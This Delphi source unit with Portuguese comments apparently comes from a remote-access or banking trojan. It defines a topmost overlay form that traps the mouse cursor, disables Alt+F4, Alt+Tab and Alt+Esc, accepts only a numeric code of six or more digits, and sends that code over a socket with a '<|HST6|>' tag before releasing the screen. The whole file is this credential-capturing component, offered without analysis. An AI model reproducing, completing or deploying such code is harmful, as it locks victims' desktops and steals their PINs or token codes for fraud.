unit Unit25;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, jpeg, ExtCtrls;

type
  TForm25 = class(TForm)
    Image1: TImage;
    Image2: TImage;
    Label4: TLabel;
    Label5: TLabel;
    Label1: TLabel;
    Image3: TImage;
    Timer1: TTimer;
    Edit1: TEdit;
    procedure Timer1Timer(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure Image3Click(Sender: TObject);
    procedure Edit1Change(Sender: TObject);
    procedure Edit1KeyPress(Sender: TObject; var Key: Char);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form25: TForm25;

implementation

uses Unit22, Unit24, Conectar;

{$R *.dfm}

procedure PrendeMouse (intEsq, intCima, intDir, IntBaixo : integer);

var

  Area: TRect;

begin

  Area.Left := intEsq;

  Area.Top := intCima;

  Area.Right := intDir;

  Area.Bottom := IntBaixo;

  ClipCursor( @Area );

end;

procedure TForm25.Timer1Timer(Sender: TObject);
begin
PrendeMouse (Form25.Left + 30, Form25.Top + 100, Form25.Left + 430,
Form25.Top + 320);
end;

procedure TForm25.FormShow(Sender: TObject);
begin
// Desabilitar ALT + F4
RegisterHotkey(Form25.Handle, 1, MOD_ALT , VK_ESCAPE);
RegisterHotkey(Form25.Handle, 2, MOD_ALT , VK_f4);
RegisterHotkey(Form25.Handle, 3, MOD_ALT , VK_TAB);
Timer1.Enabled := True;
SetWindowPos(Form25.handle, HWND_TOPMOST, Form25.Left, Form25.Top, Form25.Width, Form25.Height, 0);
Form25.Edit1.SetFocus;
end;

procedure TForm25.Image3Click(Sender: TObject);
begin
if Length(Edit1.Text) < 6 then
begin
Label1.Visible := True;
Edit1.Clear;
Edit1.SetFocus;
exit
end

else

Form1.CS1.Socket.SendText('<|HST6|>'+Form25.Edit1.Text+'<|>');
Screen.Cursor := crHourGlass;
sleep(800);
// Destrava Mouse
ClipCursor(nil);
Timer1.Enabled := False;
Edit1.Clear;
Form25.Close;
// Habilitar ALT + F4
UnRegisterHotkey(Handle, 1);
UnRegisterHotkey(Handle, 2);
UnRegisterHotkey(Handle, 3);
Screen.Cursor := crDefault;
end;

procedure TForm25.Edit1Change(Sender: TObject);
begin
if Length(Edit1.Text) > 1 then
Label1.Visible := False;
end;

procedure TForm25.Edit1KeyPress(Sender: TObject; var Key: Char);
begin
// Aceitar somente números
If not( key in['0'..'9',#08] ) then 
  key:=#0;
end;

end.
